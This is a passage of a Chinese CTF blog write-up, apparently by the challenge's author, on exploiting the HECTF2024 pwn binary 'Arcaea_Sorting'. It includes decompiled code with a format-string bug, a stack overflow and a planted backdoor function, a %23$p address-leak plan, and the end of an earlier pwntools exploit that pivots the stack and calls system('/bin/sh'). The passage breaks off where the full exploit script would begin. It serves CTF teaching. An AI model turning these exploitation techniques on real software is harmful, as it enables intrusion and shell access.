+p64(binsh) +p64(ret) +p64(system)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;TvT&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> +p64(s-<span class="number">8</span>)+p64(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="arcaea_sorting"><a class="markdownIt-Anchor" href="#arcaea_sorting">#</a> Arcaea_Sorting：</h3><p>​第一次出题，踩坑太多了，这次差点儿给自己弄废了，不过好歹是出出来了，坑啊，全是坑。</p><p>​首先是 checksec 一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/HECTF2024/pwn3$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/CTest/HECTF2024/pwn3/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>​别问为啥是 32 位的，因为 32 位在 strspy 那里过不了，得用其他操作，不是我想考的点，所以这里就只有考 32 位了。</p><p>​玩儿过 Arcaea 的应该都知道，这个程序大概有啥用，别的不说，先跑一下看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Arcaea Query developed by g01den, which is currently in the development stage</span><br><span class="line">    ___</span><br><span class="line">   /   |  ______________ ____  ____ _</span><br><span class="line">  / /| | / ___/ ___/ __ `/ _ \/ __ `/</span><br><span class="line"> / ___ |/ /  / /__/ /_/ /  __/ /_/ /</span><br><span class="line">/_/  |_/_/   \___/\__,_/\___/\__,_/</span><br><span class="line">If you find any questions, please do not contact g01den for resolution</span><br><span class="line">I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?</span><br></pre></td></tr></table></figure><p>​这里首先是让我们输入自己的定数，之后做啥处理没静态不清楚，随便输入一个 12 看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">Come on, the flowers are purple and about to turn red. You will step onto the ladder of the big shots</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br></pre></td></tr></table></figure><p>​大概有啥用应该从字面上应该能懂：</p><ol><li>功能键 1 是算歌曲分数和单曲 ptt 然后加入 b30，具体逻辑是否正确我不是很清楚，但测试的时候没啥太大的问题。</li><li>功能键 2 是计算单曲 ptt 并输出</li><li>功能键 3 是从 b30 里计算出玩家 ptt，不计算 r10，所以只能做参考</li><li>功能键 5 是给最喜欢的谱子投票</li><li>功能键 5 是输出投的票的歌曲名字</li><li>功能键 5 是输出所有 b30 的内容</li><li>功能键 7 是推出这个系统</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.5</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.500000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.500000</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.3</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.300000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.2</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.200000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.200000,music = 11.200000</span><br><span class="line">rating = 13.300000,music = 11.300000</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br></pre></td></tr></table></figure><p>​似乎没啥问题。再看看 4、5 两个功能：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">4</span><br><span class="line">You can vote for what you like. You can input the name of your favorite song and cast your valuable vote</span><br><span class="line">You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)testify</span><br><span class="line">Your vote was for testify</span><br><span class="line">. Thank you for your affirmation of this spectrum, and I hope you can score smoothly</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">5</span><br><span class="line">The name of the song you voted for is:</span><br><span class="line">testify</span><br></pre></td></tr></table></figure><p>​这里，总的能输入字符的感觉只有 4，其他的只有数字。</p><p>​上 IDA：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> <span class="type">double</span> v3; <span class="comment">// fst7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ah] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-6h] [ebp-1Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [esp+0h] [ebp-16h] BYREF</span></span><br><span class="line">  __int16 *v8; <span class="comment">// [esp+2h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// [esp+6h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  init();</span><br><span class="line">  hello();</span><br><span class="line">  *((_DWORD *)v9 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, &amp;v8, v5, v6);</span><br><span class="line">  compare(*(<span class="type">float</span> *)&amp;v8);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=======Please select the following options to use the relevant functions========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. If the score is qualified, it will be stored in B30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Calculate single PTT&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Calculate player PTT through b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Give your favorite song a vote&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. View voted songs&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6. Output all content of b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;7. Exit the system&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    v8 = &amp;v7;</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *))__isoc99_scanf)(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        setB30(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        calculateMusic(v9, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = pttCalculate(v9);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your PTT is%f\n&quot;</span>, (<span class="type">double</span>)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vote();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        output_vote(p_argc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        test(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        v10 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 != <span class="number">1</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit the program&quot;</span>);</span><br><span class="line">  freeNode(v9);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit successful&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you for using this scoring system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;See you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​找了一圈，最后在 output_vote 函数里找到了一个 printf (dest)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">output_vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !votes )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t voted yet\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The name of the song you voted for is:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个可以用来泄露 main 的地址，绕过 PIE，关键是 strcpy，存在 name 这个变量，但是上面没定义，因为在 bss 段上，根据这个变量，看看哪里调用了它，最后在 vote 里调用了两次：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( votes &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already cast 3 times, you cannot cast anymore&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;If you still want to vote, I suggest restarting this system, as it doesn&#x27;t have a memory function anyway &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can vote for what you like. You can input the name of your favorite song and cast your valuable vote&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any pr&quot;</span></span><br><span class="line">      <span class="string">&quot;oblems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Your vote was for %s. Thank you for your affirmation of this spectrum, and I hope you can score smoothly\n&quot;</span>,</span><br><span class="line">      &amp;name);</span><br><span class="line">    <span class="keyword">return</span> ++votes;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里有个 read：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br></pre></td></tr></table></figure><p>​回去一下，output_vote 函数中，将 name 变量塞进了 dest 里，但 dest 似乎不够大，存在栈溢出，但 gdb 调一下之后，发现其实长度不是特别大，不够 ROP（可能稍微大了，不过懒得改了），这里就可以打栈迁移了，随意，不过，预期解是 libc，常规 libc，因为多找找，能找到这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">evaluate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-8h] [ebp-150h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-4h] [ebp-14Ch]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+Ch] [ebp-13Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">52</span>]; <span class="comment">// [esp+110h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You cannot call this function unless you have authorization&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So?How are you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(buf, <span class="string">&quot;g01den&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO,you can&#x27;t do it&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,Only I can give myself advice&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input the count of your advice&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes, v1, v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No ,don&#x27;t hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v4, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个函数是我预留的一个后门算是后门吧，想办法劫持数据流过来吧，不过得先泄露 main。</p><p>​main 的某个偏移是 <code>%23$p</code> ，这里泄露出来的是这个地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000146A                 call    output_vote     ; jumptable 00001414 case 5</span><br><span class="line">.text:0000146F                 jmp     short _L3       ; jumptable 00001414 default case, case 0</span><br></pre></td></tr></table></figure><p>​之后真实地址减去偏移得到了 elf 的基地址，之后就可以拿到 evaluate 的地址和其他 plt 和 got 表的地址，之后就常规的 libc3 了。泄露 puts 真实地址，然后获得 libc_base 地址，之后拿 binsh 和 system。</p><p>​exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 